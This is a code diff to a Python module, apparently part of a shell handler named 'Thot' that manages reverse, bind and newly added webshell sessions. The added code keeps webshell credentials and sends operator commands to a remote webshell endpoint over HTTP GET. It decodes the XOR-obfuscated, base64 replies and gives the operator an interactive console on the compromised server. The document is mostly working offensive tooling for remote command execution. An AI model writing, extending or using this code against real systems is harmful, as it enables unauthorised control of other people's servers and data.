@@ -7,6 +7,8 @@ import json
 import sys
 import threading
 import socket
+import requests
+import base64
 from queue import Queue
 from time import sleep
 from datetime import datetime
@@ -23,12 +25,15 @@ from utilities.Messages import print_message
 print_message.name_module = __file__
 
 _pool_connections = {}
+_pool_connections_webshell = {}
 _exit_flag = False
 _count_connections = 1
 
 
 class Thot:
-    def __init__(self, __user_connection, __type_connection):
+    def __init__(self, __user_connection, __type_connection, __consumer=None):
+        self.__response_webshell = None
+        self.__url_connect_webshell = None
         self.__data_response = None
         self.__remove_connection = None
         self.__new_session = None
@@ -72,6 +77,35 @@ class Thot:
         self.__jobs_number = [1, 2]
         self.__connection_retry_bind = 7
         self.__length_id_name = 6
+        self.__consumer = __consumer
+
+    def add_webshell_connection(self):
+        self.__now = datetime.now()
+        self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
+        global _count_connections
+        global _pool_connections
+        global _pool_connections_webshell
+        try:
+            self.__session_id_name = self.generate_id_connection()
+
+            _pool_connections_webshell[self.__session_id_name] = {
+                'hostname_server': self.__address_init_connection,
+                'port_server': self.__port_init_connection,
+                'type_connection': self.__type_connection,
+                'time_session': self.__time_of_connection,
+                'username': self.__consumer[2],
+                'password': self.__consumer[3],
+                'endpoint': self.__consumer[0] + self.__consumer[1],
+                'info_connection': color.color("yellow",self.__type_connection.split("/")[-1]) + color.color("red"," -> ") + color.color("green", self.__consumer[0] + self.__consumer[1])
+            }
+            print(color.color("green", "[ info ] ") + color.color("lgray", "THOT interactive webshell session ") + color.color("yellow", str(_count_connections)) + color.color("lgray", " opened (") + color.color("yellow",self.__address_init_connection) + color.color("red", ":") + color.color("yellow", str(self.__port_init_connection)) + str(" ") + color.color("lgray",str(self.__time_of_connection[0])) + color.color("red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))
+
+            _count_connections += 1
+            add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
+
+        except Exception as Error:
+            print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
+                self.__address_accept_connections, self.__port_accept_connections, Error))
 
     def socket_create(self, __host, __port):
         try:
@@ -107,6 +141,7 @@ class Thot:
     def accept_connections(self):
         global _pool_connections
         global _count_connections
+        global _pool_connections_webshell
 
         self.__now = datetime.now()
         self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
@@ -147,13 +182,14 @@ class Thot:
                         "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))
 
                 _count_connections += 1
-                add_new_session([key for key in _pool_connections.keys()])
+                add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
             except Exception as Error:
                 print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
                     self.__address_accept_connections, self.__port_accept_connections, Error))
 
     def accept_connections_bind(self, __connection, __data_connection):
         global _pool_connections
+        global _pool_connections_webshell
         global _count_connections
         self.__now = datetime.now()
         self.__time_of_connection = " Time Local: ", self.__now.strftime('%H:%M:%S %Y/%m/%d')
@@ -192,7 +228,8 @@ class Thot:
                 "red", str(self.__time_of_connection[1])) + color.color("lgray", str(")")))
 
             _count_connections += 1
-            add_new_session([key for key in _pool_connections.keys()])
+            add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
+
         except Exception as Error:
             print_message.execution_error("There was an error connecting to the remote host {}:{} Error {}".format(
                 self.__address_accept_connections_bind, self.__port_accept_connections_bind, Error))
@@ -222,11 +259,12 @@ class Thot:
 
     def list_connections(self):
         global _pool_connections
+        global _pool_connections_webshell
         self.__result_list_connections = [
             [color.color('yellow', 'ID'), color.color('yellow', 'TYPE'), color.color('yellow', 'HOST'),
              color.color('yellow', 'PORT'), color.color('yellow', 'DESCRIPTION CONNECTION')]]
 
-        if len(_pool_connections) <= 0:
+        if len(_pool_connections) <= 0 and len(_pool_connections_webshell) <=0:
             self.__result_list_connections.append(
                 [color.color('red', 'NOT CONNECTIONS'), color.color('red', 'CONNECTIONS'),
                  color.color('red', 'CONNECTIONS'), color.color('red', 'NOT CONNECTIONS')])
@@ -245,10 +283,23 @@ class Thot:
                      color.color("green", str(_pool_connections[__key]['port_remote'])),
                      str(_pool_connections[__key]['info_connection'])])
 
+            for __key, __connection in _pool_connections_webshell.items():
+                self.__result_list_connections.append(
+                    [color.color("green_ptrl", str(__key)),
+                     color.color("lgray", str(_pool_connections_webshell[__key]['type_connection'])),
+                     color.color("green", str(_pool_connections_webshell[__key]['hostname_server'])),
+                     color.color("green", str(_pool_connections_webshell[__key]['port_server'])),
+                     str(_pool_connections_webshell[__key]['info_connection'])])
         except Exception as Error:
+            print(Error)
             self.__result_list_connections.append(
                 [color.color('red', 'NOT CONNECTIONS'), color.color('red', 'CONNECTIONS'),
                  color.color('red', 'CONNECTIONS'), color.color('red', 'NOT CONNECTIONS')])
+
+        try:
+            pass
+        except Exception as Error:
+            print(Error)
 
         print('\n')
         print(tabulate(self.__result_list_connections, headers='firstrow', tablefmt='simple', stralign='center'))
@@ -305,6 +356,7 @@ class Thot:
 
     def remove_client_connection(self, __id_connection):
         global _pool_connections
+        global _pool_connections_webshell
 
         try:
             for __key, __connection in _pool_connections.items():
@@ -318,7 +370,16 @@ class Thot:
         except Exception as Error:
             pass
 
-        add_new_session([key for key in _pool_connections.keys()])
+        try:
+            for __key, __connection in _pool_connections_webshell.items():
+                if str(__key.strip().lower()) == str(__id_connection.strip().lower()):
+                    del _pool_connections_webshell[__key]
+                    break
+        except Exception as Error:
+            pass
+
+
+        add_new_session([key for key in _pool_connections.keys()] + [key for key in _pool_connections_webshell.keys()])
         return
 
     def transfer(self, __id_connection, __connection):
@@ -414,14 +475,57 @@ class Thot:
 
         sleep(0.125)
 
+    def _decrypt(self, ciphertext, key):
+      # Crear una cadena de bytes con la clave
+      self.__key_bytes = [b for b in key.encode('utf-8')]
+
+      # Descifrar el texto con XOR y la clave
+      self.__plaintext = ''
+      self.__ciphertext_bytes = base64.b64decode(ciphertext.encode('utf-8'))
+
+      for i in range(len(self.__ciphertext_bytes)):
+        self.__plaintext += chr(self.__ciphertext_bytes[i] ^ self.__key_bytes[i % len(self.__key_bytes)])
+
+      # Devolver el texto descifrado
+      return self.__plaintext
+    def console_webshell(self, __session_id, __path):
+        self.__user = "webshell"
+        while True:
+            self.__command = input(
+                color.color("underline", color.color("lgray", "%s" % self.__user)) + " " + color.color('lgray',
+                                                                                                       '>') + " ").strip()
+
+            if self.__command == "sessions":
+                self.list_connections()
+            elif self.__command == "clear" or self.__command == "clean":
+                ScreenCleaner()
+            elif self.__command.split(" ")[0] == 'exec' or self.__command.split(" ")[0] == 'execute':
+                try:
+                    self.__command = list(self.__command.split(" "))
+                    self.__command.remove('exec' if self.__command[0] == 'exec' else 'execute')
+                    system(' '.join(self.__command))
+                except IndexError:
+                    print_message.execution_info("Please Enter command")
+            elif self.__command == "background" or self.__command == "exit":
+                break
+            else:
+                try:
+                    self.__url_connect_webshell = "{}?user={}&pwd={}&load={}".format(_pool_connections_webshell[__session_id]['endpoint'], _pool_connections_webshell[__session_id]['username'], _pool_connections_webshell[__session_id]['password'], self.__command)
+                    self.__response_webshell = requests.get(self.__url_connect_webshell)
+                    print(self._decrypt(self.__response_webshell.text, _pool_connections_webshell[__session_id]['password']))
+                except Exception as Error:
+                    print_message.execution_error(Error)
+
     def console(self, __session, __path):
         global _exit_flag
-
         thot_completer()
         _exit_flag = False
 
         if 'select' in __session:
-            self.get_targets(__session)
+            if __session.replace('select', '').strip() in _pool_connections_webshell:
+                self.console_webshell(__session.replace('select', '').strip(), __path)
+            else:
+                self.get_targets(__session)
 
         self.__user = "interpreter"
 
@@ -429,16 +533,22 @@ class Thot:
             self.__command = input(
                 color.color("underline", color.color("lgray", "%s" % self.__user)) + " " + color.color('lgray',
                                                                                                        '>') + " ").strip()
-            self.__command = self.__command.lower()
-
             if self.__command == "sessions":
                 self.list_connections()
             elif "select" in self.__command:
-                self.get_targets(self.__command)
+                if self.__command.replace('select', '').strip() in _pool_connections_webshell:
+                    self.console_webshell(self.__command.replace('select', '').strip(),__path)
+                else:
+                    self.get_targets(self.__command)
             elif "kill" in self.__command:
                 try:
                     self.__remove_connection = self.__command.split(" ")[1]
                     for key in _pool_connections.keys():
+                        if str(key.strip().lower()) == str(self.__remove_connection.strip().lower()):
+                            print_message.execution_info("killing connection {} please wait.".format(key))
+                            self.remove_client_connection(key)
+
+                    for key in _pool_connections_webshell.keys():
                         if str(key.strip().lower()) == str(self.__remove_connection.strip().lower()):
                             print_message.execution_info("killing connection {} please wait.".format(key))
                             self.remove_client_connection(key)
@@ -479,3 +589,5 @@ class Thot:
                     print_message.execution_info("Please Enter command")
             else:
                 print_message.execution_error("Command not found")
+
+
